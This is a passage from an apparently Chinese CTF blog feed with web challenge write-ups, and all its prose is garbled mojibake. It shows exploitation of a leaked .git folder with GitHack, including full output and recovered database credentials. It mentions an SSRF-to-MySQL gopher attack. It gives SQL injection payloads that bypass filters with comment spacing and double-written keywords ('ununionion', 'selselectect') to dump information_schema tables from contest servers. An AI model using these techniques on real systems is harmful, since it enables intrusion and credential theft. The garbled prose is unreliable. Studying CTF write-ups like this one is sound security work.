æ‹¿åˆ°98924acfce} åˆå¹¶ä¸€ä¸‹ hgame{0102940de110c546b2cf6898924acfce} è¯è¯´æˆ‘åšçš„æ—¶å€™æœ‰äººæŠŠå¯†ç æ”¹æˆäº†123456,æˆ‘ç›´æ¥å°±æ‹¿åˆ°äº†æœ€åä¸€ä¸ªflag,å°±æ„Ÿè§‰å¾ˆez...</p><h3 id="å¥‡æ€ªçš„sqli">å¥‡æ€ªçš„SQLi</h3><p>ç¯å¢ƒå·®ä¸å¤šé…å¥½äº†:http://119.28.22.85:12345 ä½†æ˜¯gopherä¼¼ä¹è¿ä¸ä¸Šsql..ä¹Ÿå¯èƒ½æ˜¯æˆ‘é…ç½®çš„é—®é¢˜ é¦–å…ˆ.gitæ³„æ¼,githackä¸€å‘,ä¹‹å‰é‚£ä¸ªè„šæœ¬ä¸è¡Œ..æä¸åˆ°log,æ¨èä¸€ä¸ªè„šæœ¬ <a href="https://github.com/BugScanTeam/GitHack" title="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a> ç„¶åæ‹¿åˆ°ä¹‹ålogä¸€ä¸‹,ç„¶åresetä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack# python GitHack.py http://119.28.22.85:12345/.git</span><br><span class="line"></span><br><span class="line">  ____ _ _   _   _            _</span><br><span class="line"> / ___(_) _    __ _  ___  __</span><br><span class="line">   _  __ _ / _` / __ / /</span><br><span class="line"> _   _  _   (_  (__   &lt;</span><br><span class="line"> \_____\___ _\__,_\____\_\&#123;0.0.5&#125;</span><br><span class="line"> A &#x27;.git&#x27; folder disclosure exploit.</span><br><span class="line"></span><br><span class="line">[*] Check Depends</span><br><span class="line">[+] Check depends end</span><br><span class="line">[*] Set Paths</span><br><span class="line">[*] Target Url: http://119.28.22.85:12345/.git/</span><br><span class="line">[*] Initialize Target</span><br><span class="line">[*] Try to Clone straightly</span><br><span class="line">[*] Clone</span><br><span class="line">Cloning into &#x27;/home/ubuntu/GitHack/dist/119.28.22.85_12345&#x27;...</span><br><span class="line">fatal: repository &#x27;http://119.28.22.85:12345/.git/&#x27; not found</span><br><span class="line">[-] Clone Error</span><br><span class="line">[*] Try to Clone with Directory Listing</span><br><span class="line">[*] http://119.28.22.85:12345/.git/ is not support Directory Listing</span><br><span class="line">[-] [Skip][First Try] Target is not support Directory Listing</span><br><span class="line">[*] Try to clone with Cache</span><br><span class="line">[*] Initialize Git</span><br><span class="line">[*] Cache files</span><br><span class="line">[*] packed-refs</span><br><span class="line">[*] config</span><br><span class="line">[*] HEAD</span><br><span class="line">[*] COMMIT_EDITMSG</span><br><span class="line">[*] FETCH_HEAD</span><br><span class="line">[*] /refs/heads/master</span><br><span class="line">[*] index</span><br><span class="line">[*] logs/HEAD</span><br><span class="line">[*] refs/heads/master</span><br><span class="line">[*] logs/refs/heads/master</span><br><span class="line">[*] Fetch Commit Objects</span><br><span class="line">[*] objects/e6/f0a50eaedaa25a44083a3f832a264cea3ba13a</span><br><span class="line">[*] objects/e2/f3ab9cf26f6534d9f04cb4bbbfc7770f3486ee</span><br><span class="line">[*] objects/32/2224a7f61c9d11c62fefa321ff506a24fa2d10</span><br><span class="line">[*] objects/dd/45ee5b5130bde3febd21ccb823d1a9cb341fb5</span><br><span class="line">[*] objects/98/acd10c8f8a476b279e391a4994fd1413a00800</span><br><span class="line">[*] objects/60/019e79f3d3f4d72da7bfcbafcb44cda0da8a84</span><br><span class="line">[*] objects/0d/abdd663cc60676956c8090d0f48e63b4456c03</span><br><span class="line">[*] objects/21/1fcb8891233bebe0aa087642123c3b43e8d3b0</span><br><span class="line">[*] objects/da/51001a93a4c74f4159b562449328ce16b90fe3</span><br><span class="line">[*] objects/97/43c8a21fe4e953da555ac0f14d4ca4a1bd4302</span><br><span class="line">[*] objects/db/c5e076915b5c190cc5922d15f705b6f5a4c13a</span><br><span class="line">[*] objects/a9/a17e440192ca8ff4c69e52bbecadba78ef4140</span><br><span class="line">[*] objects/89/a72a47dd1e777db9c845cf31a569c9df791134</span><br><span class="line">[*] Fetch Commit Objects End</span><br><span class="line">[*] refs/stash</span><br><span class="line">[*] Valid Repository</span><br><span class="line">[+] Valid Repository Success</span><br><span class="line"></span><br><span class="line">[+] Clone Success. Dist File : /home/ubuntu/GitHack/dist/119.28.22.85_12345</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack# ls</span><br><span class="line">data  dist  GitHack.py  lib  LICENSE  README.md</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack# cd dist</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist# ls</span><br><span class="line">119.28.22.85_12345</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist# cd 119.28.22.85_12345</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist/119.28.22.85_12345# ls</span><br><span class="line">css  index.html  index.php  login.html  login.php  register.html  register.php</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist/119.28.22.85_12345# git log</span><br><span class="line">commit e6f0a50eaedaa25a44083a3f832a264cea3ba13a</span><br><span class="line">Author: blacsheep &lt;784522717@qq.com&gt;</span><br><span class="line">Date:   Thu Mar 8 15:16:38 2018 +0000</span><br><span class="line"></span><br><span class="line">    remove config</span><br><span class="line"></span><br><span class="line">commit 322224a7f61c9d11c62fefa321ff506a24fa2d10</span><br><span class="line">Author: blacsheep &lt;784522717@qq.com&gt;</span><br><span class="line">Date:   Thu Mar 8 15:15:17 2018 +0000</span><br><span class="line"></span><br><span class="line">    add php</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist/119.28.22.85_12345# git reset --hard 322224a7f61c9d11c62fefa321ff506a24fa2d10</span><br><span class="line">HEAD is now at 322224a add php</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist/119.28.22.85_12345# ls</span><br><span class="line">config.php  css  index.html  index.php  login.html  login.php  register.html  register.php</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist/119.28.22.85_12345# cat config.php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$db_host = &#x27;localhost&#x27;;</span><br><span class="line">$db_name = &#x27;week4&#x27;;</span><br><span class="line">$db_user = &#x27;blacsheep&#x27;;</span><br><span class="line">$db_pwd = &#x27;cnss&#x27;;</span><br><span class="line">$conn = mysqli_connect($db_host, $db_user, $db_pwd, $db_name);</span><br><span class="line">if(!$conn)&#123;</span><br><span class="line">    die(mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist/119.28.22.85_12345# </span><br></pre></td></tr></table></figure><p>ç„¶åæ‹¿åˆ°mysqlçš„å¸å·å¯†ç ,ç„¶åæœ‰ä¸ªssrf,gopheræ‰“mysql æ¨èæ–‡ç« :http://www.freebuf.com/articles/web/159342.html exp:https://github.com/undefinedd/extract0r- è·‘ä¸€ä¸‹æ‹¿åˆ°flag,æœ¬åœ°ç¯å¢ƒç­‰æœ‰æ—¶é—´æˆ‘å†å»å¼„ä¸€ä¸‹å§..</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>moctfå­¦ä¹ </title>
      <link href="/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>æ¯”èµ›çš„æœ€åä¸€ä¸ªå°æ—¶æ‰çŸ¥é“.çœ‹å¤§ç¥çš„åšå®¢å­¦ä¹ ä¸€ä¸‹. å¤§ç¥åšå®¢<a href="http://skysec.top/" title="http://skysec.top/">http://skysec.top/</a>.</p><h3 id="æ˜¯æ—¶å€™è®©ä½ æ‰‹æŒ‡é”»ç‚¼ä¸€ä¸‹äº†">æ˜¯æ—¶å€™è®©ä½ æ‰‹æŒ‡é”»ç‚¼ä¸€ä¸‹äº†</h3><p>çœ‹ä¸€ä¸‹æºç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">   <span class="keyword">var</span> clicks=<span class="number">0</span></span><br><span class="line">   $(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">     $(<span class="string">&quot;#cookie&quot;</span>)</span><br><span class="line">       .<span class="title function_">mousedown</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">         $(<span class="variable language_">this</span>).<span class="title function_">width</span>(<span class="string">&#x27;350px&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;350px&#x27;</span>);</span><br><span class="line">       &#125;)</span><br><span class="line">       .<span class="title function_">mouseup</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">         $(<span class="variable language_">this</span>).<span class="title function_">width</span>(<span class="string">&#x27;375px&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;375px&#x27;</span>);</span><br><span class="line">         clicks++;</span><br><span class="line">         $(<span class="string">&quot;#clickcount&quot;</span>).<span class="title function_">text</span>(clicks);</span><br><span class="line">         <span class="keyword">if</span>(clicks &gt;= <span class="number">108000</span>)&#123;</span><br><span class="line">           <span class="keyword">var</span> form = $(<span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;&#x27;</span> +</span><br><span class="line">                       <span class="string">&#x27;&lt;input type=&quot;text&quot; name=&quot;clicks&quot; value=&quot;&#x27;</span> + clicks + <span class="string">&#x27;&quot; hidden/&gt;&#x27;</span> +</span><br><span class="line">                       <span class="string">&#x27;&lt;/form&gt;&#x27;</span>);</span><br><span class="line">                       $(<span class="string">&#x27;body&#x27;</span>).<span class="title function_">append</span>(form);</span><br><span class="line">                       form.<span class="title function_">submit</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         &#125;</span><br><span class="line">       &#125;);</span><br><span class="line">   &#125;);</span><br><span class="line"> &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹è¯·æ±‚,getä¸€ä¸ªclicks=108000</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6003/web1/?clicks=108000</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flag:moctf{Here_Is_Your_Surprise}</p><h3 id="ez-injection">ez Injection</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1</span><br></pre></td></tr></table></figure><p>è¿”å›</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;å°Šæ•¬çš„:saltyfishæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å&lt;/b&gt;&lt;/br&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure><p>éšæ„æµ‹è¯•ä¸€ä¸‹å‘ç°ç©ºæ ¼è¢«è¿‡æ»¤,æ³¨é‡Šç»•è¿‡,skyå¤§ç¥ç”¨çš„%0aç»•,å·®ä¸å¤š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/order/**/by/**/4%23</span><br></pre></td></tr></table></figure><p>æ— è¿”å›</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/order/**/by/**/3%23</span><br></pre></td></tr></table></figure><p>è¿”å›</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;å°Šæ•¬çš„:saltyfishæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å&lt;/b&gt;&lt;/br&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure><p>å‘ç°æå–çš„ä¸‰åˆ— ç„¶åå°è¯•ç”¨union select</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/union/**/select/**/1,2,3%23</span><br></pre></td></tr></table></figure><p>å‘ç°æ²¡æœ‰è¿”å›... è¿™ä¸ªæ—¶å€™æˆ‘å°±å‚»é€¼äº†...ä¸çŸ¥é“æ€ä¹ˆåš,çœ‹äº†å¤§ç¥çš„wpä¹‹å... å¤§ç¥éšæ‰‹ä¸€ä¸ªåŒå†™å°±ç»•è¿‡å»äº†.. å¤§ç¥çš„æƒ³æ³•æ˜¯..å¯èƒ½unionå’Œselectè¢«è¿‡æ»¤äº† é‚£ä¹ˆè®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/union%23</span><br></pre></td></tr></table></figure><p>åº”è¯¥æ˜¯è¿”å›æ­£å¸¸çš„ æˆ‘è‡ªå·±å»å°è¯•äº†ä¸€ä¸‹,å‘ç°ç¡®å®æ­£å¸¸,é‚£ä¹ˆä¸ºä»€ä¹ˆæ˜¯æŠŠunionæ›¿æ¢ä¸ºäº†ç©ºå‘? æˆ‘è‡ªå·±åˆå»å°è¯•äº†ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/1%23</span><br></pre></td></tr></table></figure><p>å‘ç°è¿”å›çš„æ˜¯ç©º,é‚£ä¹ˆå‰é¢çš„é‚£ä¸ªåº”è¯¥æ˜¯æŠŠunionæ›¿æ¢ä¸ºäº†ç©º,æ‰€ä»¥åŒå†™å¯ä»¥ç»•è¿‡çš„,åº”è¯¥æ˜¯è¿™ä¸ªé€»è¾‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:120.78.57.208:6002/?id=1%27/**/ununionion/**/selselectect/**/1,2,3%23</span><br></pre></td></tr></table></figure><p>å¾—åˆ°è¿”å›</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;å°Šæ•¬çš„:saltyfishæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å&lt;/b&gt;&lt;/br&gt;&lt;b&gt;å°Šæ•¬çš„:2æ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å&lt;/b&gt;&lt;/br&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæµ‹è¯•çš„æ—¶å€™å‘ç°æ‹¬å·è¢«è¿‡æ»¤äº†,ä½†æ˜¯å½±å“ä¸å¤§,ç›´æ¥æå–å°±å¥½äº† ç„¶åå»è®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:120.78.57.208:6002/?id=1&#x27;/**/ununionion/**/selselectect/**/1,table_name,3/**/from/**/information_schema.tables%23</span><br></pre></td></tr></table></figure><p>å‘ç°åˆæ²¡æœ‰è¿”å›äº†,å¤šçš„å•è¯åªæœ‰table_name,from,information,schema,ä¸€ä¸ªä¸€ä¸ªæµ‹è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/information%23</span><br></pre></td></tr></table></figure><p>åé¢çš„informationæ¢æˆtable,name,schemaéƒ½è¿”å›ç©º,è¯´æ˜æ²¡è¢«è¿‡æ»¤,ä½†æ˜¯fromè¿”å›æ­£å¸¸,é‚£ä¹ˆåŒå†™from,æå–æˆåŠŸ,ç›´æ¥æå–å‡ºäº†æ‰€æœ‰è¡¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">å°Šæ•¬çš„:saltyfishæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:CHARACTER_SETSæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:COLLATIONSæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:COLLATION_CHARACTER_SET_APPLICABILITYæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:COLUMNSæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:COLUMN_PRIVILEGESæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:ENGINESæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:EVENTSæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:FILESæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:GLOBAL_STATUSæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:GLOBAL_VARIABLESæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:KEY_COLUMN_USAGEæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:PARAMETERSæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:PARTITIONSæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:PLUGINSæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:PROCESSLISTæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:PROFILINGæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:REFERENTIAL_CONSTRAINTSæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:ROUTINESæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:SCHEMATAæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:SCHEMA_PRIVILEGESæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:SESSION_STATUSæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:SESSION_VARIABLESæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:STATISTICSæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:TABLESæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:TABLESPACESæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:TABLE_CONSTRAINTSæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:TABLE_PRIVILEGESæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:TRIGGERSæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:USER_PRIVILEGESæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:VIEWSæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:INNODB_BUFFER_PAGEæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:INNODB_TRXæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:INNODB_BUFFER_POOL_STATSæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:INNODB_LOCK_WAITSæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:INNODB_CMPMEMæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:INNODB_CMPæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:INNODB_LOCKSæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:INNODB_CMPMEM_RESETæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:INNODB_CMP_RESETæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:INNODB_BUFFER_PAGE_LRUæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:columns_privæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:dbæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:eventæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:funcæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span class="line">å°Šæ•¬çš„:general_logæ‚¨æœ¬æ¬¡æ­å–œæ‚¨æœ¬æ¬¡æ¯”èµ›è£è·ç¬¬:1å</span><br><span 